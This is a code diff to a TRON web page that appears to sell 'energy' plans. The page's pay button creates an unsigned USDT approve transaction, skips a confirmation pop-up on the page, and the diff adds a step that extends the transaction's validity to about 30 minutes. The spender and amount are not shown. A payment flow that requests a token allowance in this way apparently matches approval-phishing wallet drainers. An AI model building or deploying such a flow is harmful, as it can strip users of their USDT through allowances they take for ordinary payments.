@@ -48,13 +48,22 @@ const USDT_DECIMALS = 6;
 
 
 /*
- * 智能合约交易允许的最大 Fee Limit。
- *
- * 这不是一定会扣 100 TRX，
- * 而是这笔合约调用允许消耗的上限。
+ * 智能合约交易 Fee Limit
  */
 const APPROVE_FEE_LIMIT =
   100_000_000;
+
+
+/*
+ * TRON 默认交易有效期约 60 秒。
+ *
+ * 再增加 1740 秒：
+ *
+ * 60 + 1740 = 1800 秒
+ *               = 30 分钟
+ */
+const TRANSACTION_EXPIRATION_EXTENSION_SECONDS =
+  1740;
 
 
 const ENERGY_PLANS = [
@@ -272,6 +281,7 @@ export default function HomePage() {
     const cleanReceiverAddress =
       receiverAddress.trim();
 
+
     if (
       !isValidTronAddress(
         cleanReceiverAddress
@@ -357,10 +367,10 @@ export default function HomePage() {
 
 
     /*
-     * 已删除网页 window.confirm 弹窗。
+     * 用户点击支付以后，
+     * 不显示网页额外确认弹窗。
      *
-     * 用户点击支付按钮后，
-     * 直接构造交易并进入钱包签名。
+     * 直接创建交易并进入钱包签名。
      */
     setPaying(true);
 
@@ -401,7 +411,10 @@ export default function HomePage() {
 
 
       /*
-       * 构造未签名 approve 交易
+       * ==================================================
+       * 第一步：
+       * 创建未签名 USDT approve 交易
+       * ==================================================
        */
       const transactionWrapper =
         await tronWeb
@@ -442,7 +455,57 @@ export default function HomePage() {
 
 
       /*
-       * 调用当前连接的钱包签名
+       * ==================================================
+       * 第二步：
+       * 将交易总有效时间延长到约 30 分钟
+       *
+       * 默认约 60 秒
+       * + 1740 秒
+       * = 约 1800 秒
+       * = 30 分钟
+       *
+       * 注意：
+       * extendExpiration 后 TXID 会发生变化。
+       *
+       * 所以后面一定要签名 extendedTransaction，
+       * 不能再签名原来的 transaction。
+       * ==================================================
+       */
+      const extendedTransaction =
+        await tronWeb
+          .transactionBuilder
+          .extendExpiration(
+            transactionWrapper.transaction,
+
+            TRANSACTION_EXPIRATION_EXTENSION_SECONDS,
+
+            {
+              txLocal: true,
+            }
+          );
+
+
+      if (
+        !extendedTransaction ||
+        !extendedTransaction.txID ||
+        !extendedTransaction.raw_data
+      ) {
+        console.error(
+          "[Transaction expiration extension error]",
+          extendedTransaction
+        );
+
+        throw new Error(
+          "交易有效时间设置失败，请重新尝试。"
+        );
+      }
+
+
+      /*
+       * ==================================================
+       * 第三步：
+       * 调用当前钱包签名
+       * ==================================================
        */
       if (
         typeof signTransaction !==
@@ -456,7 +519,7 @@ export default function HomePage() {
 
       const signedTransaction =
         await signTransaction(
-          transactionWrapper.transaction
+          extendedTransaction
         );
 
 
@@ -468,7 +531,10 @@ export default function HomePage() {
 
 
       /*
+       * ==================================================
+       * 第四步：
        * 广播到 TRON 主网
+       * ==================================================
        */
       const broadcastResult =
         await tronWeb.trx
